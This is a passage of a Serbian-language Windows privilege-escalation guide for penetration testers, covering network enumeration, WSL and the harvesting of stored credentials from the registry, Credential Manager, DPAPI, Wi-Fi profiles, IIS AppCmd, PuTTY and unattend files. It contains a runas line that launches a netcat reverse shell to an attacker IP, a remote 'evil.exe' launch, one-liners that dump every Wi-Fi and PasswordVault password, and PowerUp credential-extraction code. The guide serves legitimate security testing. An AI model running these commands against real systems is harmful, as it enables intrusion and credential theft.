Za lokalni listener, povežite njegov PID sa vlasnikom procesa, putanjom do izvršne datoteke i servisom ili zakazanim zadatkom koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao korisnik desktopa samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja do binarne datoteke pasivni su tragovi, dok putanja za korupciju memorije koja zahteva autentifikaciju zahteva analizu te konkretne binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što utvrdite koji je servis u pozadini; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila zaštitnog zida

[**Pogledajte ovu stranicu za komande povezane sa zaštitnim zidom**](../basic-cmd-for-pentesters.md#firewall) **(prikažite pravila, kreirajte pravila, isključite, isključite...)**

Više[ komandi za enumeraciju mreže pronađite ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni fajl `bash.exe` može se pronaći i u putanji `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root pristup, možete slušati na bilo kom portu (prvi put kada upotrebite `nc.exe` za slušanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL fajl sistem u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava za Windows. Ako trenutni Windows identitet može da čita fajl sistem neke distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) da biste pronašli komande u kojima su možda zabeleženi akreditivi; za eskalaciju je i dalje potreban važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` odnosi se na starije instalacije WSL-a; WSL 2 obično čuva distribuciju na [virtuelnom disku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), pa prvo utvrdite koja je distribucija u pitanju i gde se nalazi. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog prikupljanja podataka.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext vrednosti u registru. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo naznaka: [Sysinternals Autologon može da čuva lozinku kao LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne utvrđuje da li taj secret postoji niti da li se može preuzeti. Pre nego što prijavite izlaganje akreditiva, proverite prava pristupa i stvarnu konfiguraciju prijavljivanja.

### Menadžer akreditiva / Windows vault

Iz [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled može delovati kao da korisnici mogu da čuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault, kao i da koristi obezbeđene akreditive umesto da korisnici svaki put unose korisničko ime i lozinku.

Ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa menadžerom akreditiva i zatraži akreditive za taj resurs** iz podrazumevanog skladišnog vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste upotrebili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenog resursa.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa datim podacima za prijavu.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da možete koristiti mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Savremene Windows UWP aplikacije, Microsoft Edge i savremene sistemske usluge čuvaju tokene za autentifikaciju i lozinke u čistom tekstu unutar Universal Windows Platform (UWP) `PasswordVault` skladišta (dostupnog i kao `Web Credentials` u `vaultcmd`). Ovo skladište je izolovano po sesiji i može se dešifrovati izvorno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Izvršite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u čistom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi tajnu korisnika ili sistema kao značajan doprinos entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisnikovih tajni za prijavljivanje**. U slučajevima sistemskog šifrovanja, koristi tajne za domensku autentifikaciju sistema.

Šifrovani korisnički RSA ključevi koji koriste DPAPI čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa nije moguće izlistati njegov sadržaj pomoću komande `dir` u CMD-u, ali ga je moguće izlistati kroz PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz module** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izdvojiti mnogo DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i automatizaciju, kao praktičan način za čuvanje šifrovanih akreditiva. Akreditivi su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljno ime datoteke ili putanju `.xml`. Ako skripta ili popis datoteka ukaže na njega, utvrdite stvarnu putanju profila naloga umesto da pretpostavite da je `C:\Users`: [Windows može da smesti profile na druga mesta](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka je samo trag; [`Export-Clixml` u Windowsu vezuje šifrovani akreditiv za korisnika i računar koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a oporavljeni nalog mora zasebno imati važeća prava na predviđenom servisu. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom uobičajenog popisivanja.

Da biste **dešifrovali** PS akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač akreditivima za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul `dpapi::rdg` u programu **Mimikatz** sa odgovarajućim `/masterkey` da biste **dešifrovali sve .rdg datoteke**\
Možete **izvući mnogo DPAPI masterkey ključeva** iz memorije pomoću modula `sekurlsa::dpapi` u programu Mimikatz

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke uobičajenih naziva kao što je `config.xml`. Utvrdite šemu veza i šifrovane atribute `Password` pre nego što XML datoteku smatrate tragom do akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti prilikom opsežnog pretraživanja.

**Izvezi profila Remote Desktop Plus** mogu se nalaziti u korisničkim fasciklama ili deljenoj administrativnoj fascikli, gde mogu biti čitljivi. Nasleđeni izvoz `profiles.xml` sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Neprazan element lozinke smatrajte tragom do akreditiva, ali nemojte ga ispisivati niti pretpostavljati da je u čistom tekstu: [dobavljač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili podešena manje strogo. Pre nego što se oslonite na njega, potvrdite poreklo datoteke i uslove oporavka.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške u `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili druge aplikacije mogu koristiti druga korisnička skladišta, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što odsustvo SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite write-ahead logging, sama kopija datoteke `plum.sqlite` može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` zajedno sa doslednom kopijom baze podataka i uključite `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite-ovu WAL dokumentaciju](https://www.sqlite.org/wal.html). Beleška koja sadrži naziv naloga ili lozinku samo je trag do akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Zapis šifrovanog upravljača lozinkama zahteva i stvarni ključ za dešifrovanje i tumačenje specifično za aplikaciju pre nego što može da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti ga na nivou High Integrity.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** i da se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalacioni programi se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i registar (kredencijali)

### Artefakti kredencijala alata za podršku u registru

Neke starije instalacije alata za udaljenu podršku čuvaju nazive vrednosti povezane s lozinkama u fiksnim ključevima registra aplikacije. Na primer, `SecurityPasswordAES` u TeamViewer-u označavao je konfigurisanu statičku lozinku sesije u verzijama pre 9, prema [objašnjenju dobavljača o ključu registra](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Oznaka u nazivu vrednosti samo je povod za proveru: pre procene kredencijala proverite instaliranu verziju, čitljive podatke vrednosti, format i trenutno ponašanje autentifikacije. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Ne uključujte šifrat i oporavljene lozinke u uobičajeni izlaz enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da čitljiva deljena radna sveska sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje i nije bezbednosna funkcija; ona sama po sebi ne potvrđuje da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Čitljiva putanja `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da kredencijali postoje niti da neki nalog ima veće privilegije; posebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane zakrpe izmena CI servera

CI server može da zadrži poslate izmene izvornog koda u svom direktorijumu sa podacima i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) da je `system/changes` skladište izmena za udaljeno pokretanje; direktorijum sa podacima može da se konfiguriše i ne mora da bude u okviru `ProgramData`. Čitljiva zakrpa može da sačuva uklonjene ili dodate reference na datoteku sa kredencijalima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, PowerShell tok rada `ConvertTo-SecureString -Key` zahteva AES ključ pored šifrovanog niza; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ zadaje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u uobičajeni izlaz enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da su kredencijali važeći niti da omogućavaju pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma sa podacima i izbegavajte unošenje tajni u izmene za izgradnju.

### Prilagođena rotacija lozinke lokalnog administratora

Domaći rotator lozinki može da čuva šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a da pritom kredencijale za skladište podataka drži u čitljivoj datoteci `.env` ili pored binarne datoteke programa za ažuriranje. Zajedno pregledajte zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, slušač i dozvole za skladište podataka. Skladištu podataka koje sluša samo na loopback interfejsu i dalje može da pristupi lokalni korisnik sa važećim kredencijalima, ali sama autentifikacija ne dokazuje da ima dozvolu za čitanje relevantnih zapisa. Ako su seme za šifrovanje ili ključni materijal dostupni pored šifrata, pre nego što se oslonite na šifrovanje proverite tačan način izvođenja ključa. Šema koja deterministički izvodi AES ključ iz izloženog semena pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije pogodna za zaštitu te lozinke; Go navodi da taj paket nije prikladan za slučajnost osetljivu na bezbednost. Pre nego što oporavljenu lozinku smatrate putem za eskalaciju, potvrdite da je važeća i da pripada nalogu iz grupe lokalnih administratora. Zakazani zadatak, putanja `.env` datoteke ili šifrovani blob sami po sebi ne dokazuju nijedan od tih uslova. Ne uključujte lozinke i ključni materijal u uobičajeni izlaz enumeracije.

Za upravljane lozinke lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegove kontrole pristupa i skladištenje zasnovano na direktorijumu ili Entra sistemu razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge u Elasticsearch-u](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba kredencijala

Neki dodaci Java servera distribuiraju se kao JAR arhive u direktorijumu servera `plugins`. Čitljiv prilagođeni dodatak može da sadrži konfiguraciju ili bajtkod sa ugrađenim kredencijalom usluge. Arhivu pregledajte samo uz ovlašćenje i ne uključujte oporavljene tajne u uobičajeni izlaz enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a oporavljena lozinka usluge vodi do većih privilegija samo ako je važeća i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo upotrebljene kredencijale zasebnim tajnama. Za raspored direktorijuma pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/), a za sadržaj arhiva [Oracle dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Kredencijali ugrađene baze podataka Openfire-a

Openfire instalacija koja koristi ugrađenu bazu podataka može da čuva `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da je čita, zajedno pregledajte zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija o dobavljaču korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu da se čuvaju kao običan tekst ili da budu šifrovane ključem koji se čuva u tom svojstvu. Oporavljena lozinka je relevantna za eskalaciju samo ako je i dalje važeća za privilegovaniji identitet; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu kredencijala. Putanja je samo nagoveštaj za inventarisanje, zato ne uključujte sadržaj baze podataka i kredencijale u uobičajeni izlaz enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može da otkrije konfigurisane portove i interfejs za vezivanje administratorske konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog i dalje može da dođe do te adrese ako je slušač pokrenut. Zajedno proverite stvarni slušač, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može da izazove izvršavanje njegovog koda u kontekstu usluge, što može da pruži visoke privilegije ako usluga radi као LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli niti izvršavanje koda. Pogledajte dobavljačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` internog CA-a. Ako korisnik sa manjim privilegijama može da čita taj ključ, možda će moći da izda API klijentski sertifikat. Da li to vodi do većih privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njen pronalazak ne dokazuje pristup CA-u servera. Neke instalacije čuvaju privatni ključ CA-a van mreže, pa čitljiva konfiguracija servera možda ne sadrži ključ za potpisivanje.

Na Windows serveru pregledajte ACL konfiguracije **servera** u njegovom instalacionom direktorijumu i svih zaštićenih rezervnih копija. Jedna moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako je putanja drugačija, koristite onu koja je konfigurisana za uslugu. Potvrdite da trenutni identitet može da čita datoteku i da је `CA.private_key` заиста присутан. Не исписујте приватни кључ у евиденцију или излаз enumeracije. Dobavljačev tok rada `config api_client` koristi ključ CA-a za izdavanje klijentskog sertifikata, ali potrebna je i efektivna uloga na serveru; njeno kreiranje ili menjanje može da zahteva dozvolu za upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može da pruži put i kada takav upis nije dostupan. API upiti sa pravima za izvršavanje pokreću se u relevantnom kontekstu servera ili agenta, koji može da ima visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, čuvajte potpisni ključ CA-a van mreže kada je moguće i ograničite API uloge i pristup slušaču. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [uputstva za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### Putty kredencijali

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban upravljač sesijama. Njegovo izvorno šifrovano skladište može se nalaziti na putanji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugom mestu. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i da mogu sadržati sesije, ključeve, skripte, oznake i veze; njegov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifikuje izvorno skladište. Najpre proverite dozvole nad datotekama i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti uskladišteni u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos u toj putanji, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se može lako dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće pri pokretanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije važeća. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije detektovao korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za unattended instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
